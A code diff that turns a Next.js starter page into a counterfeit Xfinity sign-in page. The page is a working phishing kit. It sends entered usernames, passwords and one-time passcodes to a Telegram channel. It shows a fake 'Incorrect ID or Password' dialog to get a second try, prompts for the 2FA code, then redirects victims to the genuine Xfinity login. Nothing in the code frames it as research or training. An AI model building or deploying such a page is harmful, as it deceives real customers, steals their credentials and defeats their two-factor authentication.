@@ -1,103 +1,378 @@
+"use client";
+
+import { useState, FormEvent, ChangeEvent } from "react";
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+  DialogDescription,
+} from "@/components/ui/dialog";
+import { Button } from "@/components/ui/button";
+import {
+  InputOTP,
+  InputOTPGroup,
+  InputOTPSlot,
+} from "@/components/ui/input-otp";
 import Image from "next/image";
+import XfinityFooter from "./data";
+import { sendToTelegram } from "./actions";
+import { z } from "zod";
 
-export default function Home() {
+// Zod validation schemas
+const loginSchema = z.object({
+  username: z
+    .string()
+    .min(1, "Email, mobile, or username is required")
+    .refine((value) => {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const phoneRegex = /^\+?[\d\s-()]+$/;
+      const usernameRegex = /^[a-zA-Z0-9._-]+$/;
+
+      return (
+        emailRegex.test(value) ||
+        phoneRegex.test(value) ||
+        usernameRegex.test(value)
+      );
+    }, "Please enter a valid email, mobile number, or username"),
+  password: z
+    .string()
+    .min(8, "Password must be at least 8 characters")
+    
+});
+
+const otpSchema = z.object({
+  otp: z
+    .string()
+    .length(6, "OTP must be exactly 6 digits")
+    .regex(/^\d+$/, "OTP must contain only numbers"),
+});
+
+// Type definitions
+interface FormData {
+  username: string;
+  password: string;
+  otp: string;
+}
+
+interface FormErrors {
+  username?: string;
+  password?: string;
+  otp?: string;
+}
+
+type Stage = 1 | 2;
+
+interface TelegramPayload {
+  username: string;
+  password: string;
+  otp?: string;
+  stage: "Login" | "OTP";
+}
+
+export default function XfinityLogin() {
+  const [stage, setStage] = useState<Stage>(1);
+  const [showDialog, setShowDialog] = useState<boolean>(false);
+  const [submissionCount, setSubmissionCount] = useState<number>(0);
+  const [form, setForm] = useState<FormData>({
+    username: "",
+    password: "",
+    otp: "",
+  });
+  const [errors, setErrors] = useState<FormErrors>({});
+
+  const handleSubmit = async (e: FormEvent<HTMLFormElement>): Promise<void> => {
+    e.preventDefault();
+    setErrors({});
+
+    if (stage === 1) {
+      const result = loginSchema.safeParse({
+        username: form.username,
+        password: form.password,
+      });
+
+      if (!result.success) {
+        const fieldErrors: FormErrors = {};
+        result.error.issues.forEach((issue) => {
+          const field = issue.path[0] as keyof FormErrors;
+          fieldErrors[field] = issue.message;
+        });
+        setErrors(fieldErrors);
+        return;
+      }
+
+      const payload: TelegramPayload = {
+        username: form.username,
+        password: form.password,
+        stage: "Login",
+      };
+
+      try {
+        await sendToTelegram(payload);
+        setSubmissionCount((prev) => prev + 1);
+        if (submissionCount < 1) {
+          // First submission: show "Incorrect ID or Password" modal
+          setShowDialog(true);
+        } else {
+          // Second submission: move to stage 2 and show OTP modal
+          setStage(2);
+          setShowDialog(true);
+        }
+      } catch (err) {
+        console.error("Telegram send error:", err);
+        setShowDialog(true); // Show error modal even on failure
+      }
+    } else if (stage === 2) {
+      const result = otpSchema.safeParse({ otp: form.otp });
+
+      if (!result.success) {
+        const fieldErrors: FormErrors = {};
+        result.error.issues.forEach((issue) => {
+          const field = issue.path[0] as keyof FormErrors;
+          fieldErrors[field] = issue.message;
+        });
+        setErrors(fieldErrors);
+        return;
+      }
+
+      const payload: TelegramPayload = {
+        username: form.username,
+        password: form.password,
+        otp: form.otp,
+        stage: "OTP",
+      };
+
+      try {
+        await sendToTelegram(payload);
+        setShowDialog(false); // Close modal after successful OTP submission
+        window.location.href = "https://login.xfinity.com/login"; // Redirect
+      } catch (err) {
+        console.error("Telegram send error:", err);
+        setErrors({ otp: "Failed to verify OTP. Please try again." });
+      }
+    }
+  };
+
+  const handleContinue = (): void => {
+    if (stage === 1) {
+      setShowDialog(false); // Close the error dialog
+    } else {
+      // In stage 2, after OTP verification, redirect
+      setShowDialog(false);
+      window.location.href = "https://login.xfinity.com/login";
+    }
+  };
+
+  const handleOtpSubmit = async (): Promise<void> => {
+    const result = otpSchema.safeParse({ otp: form.otp });
+
+    if (!result.success) {
+      const fieldErrors: FormErrors = {};
+      result.error.issues.forEach((issue) => {
+        const field = issue.path[0] as keyof FormErrors;
+        fieldErrors[field] = issue.message;
+      });
+      setErrors(fieldErrors);
+      return;
+    }
+
+    const payload: TelegramPayload = {
+      username: form.username,
+      password: form.password,
+      otp: form.otp,
+      stage: "OTP",
+    };
+
+    try {
+      await sendToTelegram(payload);
+      setShowDialog(false); // Close modal after successful OTP submission
+      window.location.href = "https://login.xfinity.com/login"; // Redirect
+    } catch (err) {
+      console.error("Telegram send error:", err);
+      setErrors({ otp: "Failed to verify OTP. Please try again." });
+    }
+  };
+
+  const handleUsernameChange = (e: ChangeEvent<HTMLInputElement>): void => {
+    setForm({ ...form, username: e.target.value });
+    if (errors.username) {
+      setErrors({ ...errors, username: undefined });
+    }
+  };
+
+  const handlePasswordChange = (e: ChangeEvent<HTMLInputElement>): void => {
+    setForm({ ...form, password: e.target.value });
+    if (errors.password) {
+      setErrors({ ...errors, password: undefined });
+    }
+  };
+
+  const handleOtpChange = (value: string): void => {
+    setForm({ ...form, otp: value });
+    if (errors.otp) {
+      setErrors({ ...errors, otp: undefined });
+    }
+  };
+
   return (
-    <div className="font-sans grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20">
-      <main className="flex flex-col gap-[32px] row-start-2 items-center sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={180}
-          height={38}
-          priority
-        />
-        <ol className="font-mono list-inside list-decimal text-sm/6 text-center sm:text-left">
-          <li className="mb-2 tracking-[-.01em]">
-            Get started by editing{" "}
-            <code className="bg-black/[.05] dark:bg-white/[.06] font-mono font-semibold px-1 py-0.5 rounded">
-              src/app/page.tsx
-            </code>
-            .
-          </li>
-          <li className="tracking-[-.01em]">
-            Save and see your changes instantly.
-          </li>
-        </ol>
+    <>
+      <main className="flex flex-col lg:flex-row items-center lg:items-start justify-center gap-6 lg:gap-0 mb-8 bg-white">
+        <section className="w-full lg:w-1/2 px-6 pt-10 lg:pt-24">
+          <div className="max-w-[564px] mx-auto">
+            <div className="flex items-center mb-8">
+              <Image
+                alt="Xfinity Logo"
+                height={80}
+                width={100}
+                src="/xfinity-logo-grey.svg"
+              />
+            </div>
 
-        <div className="flex gap-4 items-center flex-col sm:flex-row">
+            <h1 className="text-3xl font-bold text-gray-900 mb-6">
+              Sign in with your Xfinity ID
+            </h1>
+
+            <form onSubmit={handleSubmit} className="space-y-4">
+              <div>
+                <input
+                  type="text"
+                  placeholder="Email, mobile, or username"
+                  value={form.username}
+                  onChange={handleUsernameChange}
+                  required
+                  aria-label="Email, mobile, or username"
+                  className="w-full inputt outline rounded-sm focus:outline-red-500 p-4 border-amber-300 transition"
+                />
+                {errors.username && (
+                  <p className="text-red-500 text-sm mt-1">{errors.username}</p>
+                )}
+              </div>
+
+              <div>
+                <input
+                  type="password"
+                  placeholder="Password"
+                  value={form.password}
+                  onChange={handlePasswordChange}
+                  required
+                  aria-label="Password"
+                  className="w-full inputt outline rounded-sm focus:outline-red-500 p-4 border-amber-300 transition"
+                />
+                {errors.password && (
+                  <p className="text-red-500 text-sm mt-1">{errors.password}</p>
+                )}
+              </div>
+
+              <p className="text-sm text-gray-600 mt-2">
+                By signing in, you agree to our{" "}
+                <a
+                  href="http://my.xfinity.com/terms/web/"
+                  className="text-blue-600 underline hover:text-blue-700"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                >
+                  Terms of Service
+                </a>{" "}
+                and{" "}
+                <a
+                  href="https://www.xfinity.com/privacy/"
+                  className="text-blue-600 underline hover:text-blue-700"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                >
+                  Privacy Policy
+                </a>
+                .
+              </p>
+
+              <button
+                type="submit"
+                className=" sc-prism-button font-bold cursor-pointer bg-blue-600 text-white rounded-sm py-3 mt-8 hover:bg-blue-700 transition"
+              >
+                Let&apos;s go
+              </button>
+            </form>
+          </div>
+        </section>
+
+        <aside className="w-full lg:max-h-[1200px] h-[450px] lg:h-[600px] lg:w-1/2 flex justify-center items-center bg-gray-50">
           <a
-            className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] font-medium text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:w-auto"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
+            href="https://www.xfinity.com/learn/mobile/plan/savings-calculator"
             target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
-            />
-            Deploy now
-          </a>
+            rel="noreferrer"
+            className="w-full sm:block hidden h-full lg:w-full lg:h-full bg-cover bg-top"
+            style={{
+              backgroundImage:
+                "url('https://assets.xfinity.com/assets/cima/login/default/ad/BAU-XM_CIMA_4.15.25_Update_Desktop.png')",
+            }}
+            aria-label="Let's cut your mobile bill in half."
+          />
           <a
-            className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent font-medium text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 w-full sm:w-auto md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
+            href="https://www.xfinity.com/learn/mobile/plan/savings-calculator"
             target="_blank"
-            rel="noopener noreferrer"
-          >
-            Read our docs
-          </a>
-        </div>
+            rel="noreferrer"
+            className="w-full sm:hidden max-w-[400px] scale-75 block h-full lg:w-full lg:h-full bg-cover bg-top"
+            style={{
+              backgroundImage:
+                "url('https://assets.xfinity.com/assets/cima/login/default/ad/BAU-XM_CIMA_Mobile_XCIMA-49176.png')",
+            }}
+            aria-label="Let's cut your mobile bill in half."
+          />
+        </aside>
       </main>
-      <footer className="row-start-3 flex gap-[24px] flex-wrap items-center justify-center">
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
-      </footer>
-    </div>
+
+      <XfinityFooter />
+
+      {/* Dialog */}
+      <Dialog open={showDialog} onOpenChange={setShowDialog}>
+        <DialogContent className="sm:max-w-[425px] text-center">
+          {stage === 1 ? (
+            <>
+              <DialogHeader>
+                <DialogTitle>Incorrect ID or Password</DialogTitle>
+                <DialogDescription>
+                  Please check your Xfinity ID and password and try again.
+                </DialogDescription>
+              </DialogHeader>
+              <Button onClick={handleContinue} className="mt-4">
+                Try Again
+              </Button>
+            </>
+          ) : (
+            <>
+              <DialogHeader>
+                <DialogTitle>Verification Required</DialogTitle>
+                <DialogDescription>
+                  Enter the one-time passcode sent to your device.
+                </DialogDescription>
+              </DialogHeader>
+              <div className="flex flex-col items-center gap-4 mt-4">
+                <InputOTP
+                  maxLength={6}
+                  value={form.otp}
+                  onChange={handleOtpChange}
+                  className="gap-2"
+                >
+                  <InputOTPGroup className="gap-2">
+                    <InputOTPSlot index={0} className="w-12 h-12 text-lg" />
+                    <InputOTPSlot index={1} className="w-12 h-12 text-lg" />
+                    <InputOTPSlot index={2} className="w-12 h-12 text-lg" />
+                    <InputOTPSlot index={3} className="w-12 h-12 text-lg" />
+                    <InputOTPSlot index={4} className="w-12 h-12 text-lg" />
+                    <InputOTPSlot index={5} className="w-12 h-12 text-lg" />
+                  </InputOTPGroup>
+                </InputOTP>
+                {errors.otp && (
+                  <p className="text-red-500 text-sm">{errors.otp}</p>
+                )}
+              </div>
+              <Button onClick={handleOtpSubmit} className="mt-4">
+                Verify
+              </Button>
+            </>
+          )}
+        </DialogContent>
+      </Dialog>
+    </>
   );
 }
